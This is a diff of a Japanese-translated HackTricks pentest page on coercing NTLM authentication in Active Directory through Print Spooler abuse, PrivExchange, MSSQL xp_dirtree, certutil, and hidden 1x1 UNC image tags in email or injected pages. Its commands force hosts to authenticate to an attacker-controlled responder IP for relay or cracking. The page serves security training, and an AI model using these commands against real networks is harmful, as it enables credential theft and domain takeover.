@@ -1,71 +1,74 @@
-# NTLM特権認証を強制する
+# Force NTLM Privileged Authentication
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学びましょう</strong></a><strong>！</strong></summary>
+<summary>Support HackTricks</summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
-* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
-* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)は、**MIDLコンパイラ**を使用してC#でコーディングされた**リモート認証トリガーのコレクション**です。これにより、第三者の依存関係を回避できます。
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) は、**3rd party dependencies**を避けるためにMIDLコンパイラを使用してC#でコーディングされた**リモート認証トリガー**の**コレクション**です。
 
-## スプーラーサービスの悪用
+## Spooler Service Abuse
 
-_**Print Spooler**_サービスが**有効**になっている場合、既知のAD資格情報を使用して、**ドメインコントローラーのプリントサーバーに新しい印刷ジョブの更新を要求**し、**通知を特定のシステムに送信するように指示**できます。\
-プリンターが任意のシステムに通知を送信するとき、その**システムに対して認証する必要があります**。したがって、攻撃者は_**Print Spooler**_サービスを任意のシステムに対して認証させ、サービスはこの認証で**コンピューターアカウント**を使用します。
+_**Print Spooler**_ サービスが**有効**な場合、既知のAD資格情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの**更新**を**要求**し、通知を**任意のシステムに送信するように指示**できます。\
+プリンターが任意のシステムに通知を送信する際には、その**システムに対して認証**する必要があります。したがって、攻撃者は_**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証では**コンピュータアカウント**が使用されます。
 
-### ドメイン上のWindowsサーバーを見つける
+### Finding Windows Servers on the domain
 
-PowerShellを使用して、Windowsボックスのリストを取得します。通常、サーバーが優先されるため、そこに焦点を当てましょう：
+PowerShellを使用して、Windowsボックスのリストを取得します。サーバーは通常優先されるため、そこに焦点を当てましょう:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### スプーラーサービスのリスニングを見つける
+### Spoolerサービスのリスニングを確認する
 
-やや修正された @mysmartlogin's (Vincent Le Toux's) の [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) を使用して、スプーラーサービスがリスニングしているかどうかを確認します：
+少し修正された@mysmartlogin（Vincent Le Toux）の[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)を使用して、Spoolerサービスがリスニングしているか確認します：
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-あなたはLinux上でrpcdump.pyを使用し、MS-RPRNプロトコルを探すこともできます。
+Linux上でrpcdump.pyを使用し、MS-RPRNプロトコルを探すこともできます。
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### 任意のホストに対してサービスに認証を要求する
+### サービスに任意のホストに対して認証を要求させる
 
-[ここから**SpoolSampleをコンパイルできます**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**。**
+[**ここからSpoolSampleをコンパイルできます**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-または、[**3xocyteのdementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)または[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)を使用している場合は、Linuxを使用してください。
+または、Linuxを使用している場合は、[**3xocyteのdementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)または[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)を使用してください。
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
-### Unconstrained Delegationと組み合わせる
+### Unconstrained Delegationとの組み合わせ
 
-攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)を利用してコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに認証させる**ことができます。Unconstrained Delegationにより、**プリンタのコンピュータアカウントのTGT**がUnconstrained Delegationを持つコンピュータのメモリに**保存されます**。攻撃者はすでにこのホストを侵害しているため、このチケットを**取得して悪用**することができます（[Pass the Ticket](pass-the-ticket.md)）。
+攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)を持つコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに対して認証させる**ことができます。制約のない委任のため、**プリンタのコンピュータアカウントのTGT**は、制約のない委任を持つコンピュータの**メモリ**に**保存されます**。攻撃者はすでにこのホストを侵害しているため、**このチケットを取得し**、それを悪用することができます（[Pass the Ticket](pass-the-ticket.md)）。
 
-## RCP Force authentication
+## RCP強制認証
 
 {% embed url="https://github.com/p0dalirius/Coercer" %}
 
 ## PrivExchange
 
-`PrivExchange`攻撃は、**Exchange Serverの`PushSubscription`機能**に見つかった欠陥の結果です。この機能により、Exchangeサーバを持つ任意のドメインユーザーが、HTTP経由でクライアント提供のホストに強制的に認証させることができます。
+`PrivExchange`攻撃は、**Exchange Serverの`PushSubscription`機能**に見つかった欠陥の結果です。この機能により、メールボックスを持つ任意のドメインユーザーがHTTP経由で任意のクライアント提供ホストに対してExchangeサーバーを強制的に認証させることができます。
 
-デフォルトでは、**ExchangeサービスはSYSTEMとして実行**され、過剰な特権が与えられます（具体的には、**2019年以前の累積更新プログラムでドメインのWriteDacl特権が与えられます**）。この欠陥を悪用すると、**情報をLDAPに中継し、その後ドメインNTDSデータベースを抽出**することができます。LDAPへの中継ができない場合でも、この欠陥を使用してドメイン内の他のホストに中継および認証することができます。この攻撃の成功により、認証されたドメインユーザーアカウントを使用して、Domain Adminへの直接アクセスが可能となります。
+デフォルトでは、**ExchangeサービスはSYSTEMとして実行され**、過剰な特権が与えられています（具体的には、**2019年以前の累積更新のドメインに対するWriteDacl特権**があります）。この欠陥は、**LDAPへの情報の中継を可能にし、その後ドメインNTDSデータベースを抽出する**ために悪用できます。LDAPへの中継が不可能な場合でも、この欠陥はドメイン内の他のホストに対して中継および認証するために使用できます。この攻撃の成功した悪用は、認証された任意のドメインユーザーアカウントでドメイン管理者への即時アクセスを許可します。
 
-## Inside Windows
+## Windows内部
 
-Windowsマシン内部にすでにいる場合、特権アカウントを使用してWindowsをサーバに接続するように強制することができます:
+すでにWindowsマシン内にいる場合、特権アカウントを使用してサーバーに接続するようWindowsを強制することができます：
 
 ### Defender MpCmdRun
 ```bash
@@ -75,11 +78,11 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
-または、別のテクニックを使用することもできます: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+または、この別の技術を使用します: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
 ### Certutil
 
-certutil.exe lolbin（Microsoftによって署名されたバイナリ）を使用してNTLM認証を強制することが可能です:
+certutil.exe lolbin（Microsoft署名のバイナリ）を使用してNTLM認証を強制することが可能です:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
@@ -87,17 +90,34 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 
 ### メール経由
 
-コンプロマイズしたいマシンにログインするユーザーの**メールアドレス**を知っている場合、以下のような**1x1の画像が埋め込まれたメール**を送信することができます。
+もしあなたが侵入したいマシンにログインしているユーザーの**メールアドレス**を知っているなら、**1x1画像**を含む**メール**を送ることができます。
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
+そして、彼がそれを開くと、認証を試みるでしょう。
+
 ### MitM
 
-コンピュータに対してMitM攻撃を実行し、彼が視覚化するページにHTMLを注入できる場合、次のような画像をページに注入してみることができます：
+もしあなたがコンピュータに対してMitM攻撃を実行し、彼が視覚化するページにHTMLを注入できるなら、次のような画像をページに注入してみることができます：
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## NTLMv1のクラック
+## NTLMv1のクラッキング
 
-[NTLMv1のチャレンジをキャプチャできる場合は、こちらを参照してクラック方法を確認してください](../ntlm/#ntlmv1-attack)。\
-_**NTLMv1をクラックするには、Responderのチャレンジを "1122334455667788" に設定する必要があります。**_
+[NTLMv1チャレンジをキャプチャできる場合は、ここでそれをクラッキングする方法を読んでください](../ntlm/#ntlmv1-attack)。\
+_ NTLMv1をクラッキングするには、Responderチャレンジを「1122334455667788」に設定する必要があることを忘れないでください。_
+
+{% hint style="success" %}
+AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>HackTricksをサポートする</summary>
+
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+
+</details>
+{% endhint %}
